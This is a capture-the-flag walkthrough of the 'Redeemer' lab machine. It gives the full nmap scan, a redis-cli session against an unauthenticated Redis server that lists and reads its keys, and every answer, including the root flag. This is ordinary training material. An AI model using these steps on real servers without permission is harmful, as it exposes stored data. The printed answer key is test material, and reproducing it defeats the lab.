#### Guide on REDEEMER CTF Machine

##### Redis, which stands for "Remote Dictionary Server," is an open-source, in-memory database. It is often referred to as a "data structure server" because it allows you to store and manipulate various data structures in memory, including strings, lists, sets, maps, and more. 

##### In-memory databases like Redis are typically used to cache data that is frequently requested for quick retrieval. For example, if there is a website that returns some prices on the front page of the site. The website may be written to first check if the needed prices are in Redis, and if not, then check the traditional database (like MySQL or MongoDB). When the value is loaded from the database, it is then stored in Redis for some shorter period of time (seconds or minutes or hours), to handle any similar requests that arrive during that timeframe. For a site with lots of traffic, this configuration allows for much faster retrieval for the majority of requests, while still having stable long term storage in the main database.

1. Which TCP port is open on the machine?<br>
6379
	```bash
	nmap -p- -sV 10.129.79.51
	Nmap scan report for 10.129.79.51
	Host is up (0.24s latency).
	Not shown: 65534 closed tcp ports (conn-refused)
	PORT     STATE SERVICE VERSION
	6379/tcp open  redis   Redis key-value store 5.0.7
	```
2. Which service is running on the port that is open on the machine?<br>
redis

3. What type of database is Redis? Choose from the following options: (i) In-memory Database, (ii) Traditional Database<br>
In-memory Database

4. Which command-line utility is used to interact with the Redis server? Enter the program name you would enter into the terminal without any arguments.<br>
redis-cli

5. Which flag is used with the Redis command-line utility to specify the hostname?<br>
-h

6. Once connected to a Redis server, which command is used to obtain the information and statistics about the Redis server?<br>
info
	```bash
	redis-cli -h 10.129.79.51 -p 6379
	10.129.79.51:6379> info
	edis_version:5.0.7
	redis_git_sha1:00000000
	redis_git_dirty:0
	redis_build_id:66bd629f924ac924
	redis_mode:standalone
	os:Linux 5.4.0-77-generic x86_64
	arch_bits:64
	multiplexing_api:epoll
	atomicvar_api:atomic-builtin
	gcc_version:9.3.0
	process_id:751
	run_id:e6409d64799f2398ecde15d57d1d877bf1317b39
	tcp_port:6379
	.
	.
	.
	```
7. What is the version of the Redis server being used on the target machine?<br>	
5.0.7

8. Which command is used to select the desired database in Redis?<br>
select 
	```bash
	10.129.79.51:6379> select 0
	OK
	10.129.79.51:6379> keys *
	1) "flag"
	2) "temp"
	3) "numb"
	4) "stor"
	10.129.79.51:6379> get flag
	"03e1d2b376c37ab3f5319922053953eb"
	```
9. How many keys are present inside the database with index 0?<br>
4

10. Which command is used to obtain all the keys in a database?<br>
keys *

11. Submit root flag<br>
03e1d2b376c37ab3f5319922053953eb

